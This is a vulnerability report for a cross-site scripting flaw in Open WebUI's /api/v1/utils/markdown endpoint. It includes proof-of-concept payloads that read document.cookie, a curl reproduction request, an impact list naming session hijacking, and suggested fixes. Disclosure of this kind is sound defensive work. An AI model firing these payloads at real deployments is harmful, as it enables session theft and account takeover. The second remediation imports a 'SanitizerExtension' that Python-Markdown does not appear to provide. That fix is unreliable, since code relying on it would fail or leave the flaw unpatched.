# Vulnerability Report: Markdown-to-HTML XSS via /api/v1/utils/markdown
## ADDITIONAL FINDING — Submit alongside SSRF report

---

**Title:** Reflected Cross-Site Scripting (XSS) via Unsanitized Markdown-to-HTML Conversion

**Severity:** Medium (CVSS 5.4 — AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)

**Affected Component:**
- Repository: https://github.com/open-webui/open-webui
- File: `backend/open_webui/routers/utils.py` (lines 80-82)
- Endpoint: `POST /api/v1/utils/markdown`

**Weakness:** CWE-79 (Cross-Site Scripting)

---

## Summary

The `/api/v1/utils/markdown` endpoint converts user-supplied markdown to HTML using Python's `markdown` library **without any HTML sanitization**. The `markdown` library, by default, passes raw HTML through unchanged. If the frontend renders the returned HTML (which is likely, since Open WebUI renders markdown in chat messages), an attacker can inject arbitrary JavaScript.

---

## Vulnerable Code

```python
# utils.py line 80-82
@router.post('/markdown')
async def get_html_from_markdown(form_data: MarkdownForm, user=Depends(get_verified_user)):
    return {'html': markdown.markdown(form_data.md)}
```

The `markdown.markdown()` function does NOT sanitize HTML by default. Input like `<script>alert(document.cookie)</script>` passes through unchanged.

---

## Steps to Reproduce

1. Log in as any verified user.

2. Send a POST request to the markdown endpoint:
   ```bash
   curl -X POST 'http://localhost:3000/api/v1/utils/markdown' \
     -H 'Authorization: Bearer <TOKEN>' \
     -H 'Content-Type: application/json' \
     -d '{"md": "<img src=x onerror=alert(document.cookie)>"}'
   ```

3. Response:
   ```json
   {"html": "<p><img src=x onerror=alert(document.cookie)></p>"}
   ```

4. If the frontend renders this HTML (via `dangerouslySetInnerHTML` or equivalent), the JavaScript executes in the user's browser context.

---

## Impact

- **Session hijacking**: Attacker can steal session cookies/tokens
- **Account takeover**: With access to the user's session, the attacker can perform any action
- **Data theft**: Read private conversations, knowledge bases, and user data
- **CSRF bypass**: Execute actions on behalf of the victim

---

## Remediation

Sanitize the markdown output before returning:

```python
import bleach

@router.post('/markdown')
async def get_html_from_markdown(form_data: MarkdownForm, user=Depends(get_verified_user)):
    html = markdown.markdown(form_data.md)
    clean_html = bleach.clean(html, tags=['p', 'br', 'strong', 'em', 'code', 'pre', 'a', 'ul', 'ol', 'li', 'h1', 'h2', 'h3'], attributes={'a': ['href']})
    return {'html': clean_html}
```

Or use `markdown.extensions.sanitizer.SanitizerExtension`:
```python
import markdown
from markdown.extensions.sanitizer import SanitizerExtension

html = markdown.markdown(form_data.md, extensions=[SanitizerExtension()])
```

---

*Found during code review of open-webui/open-webui, 2026-05-11.*
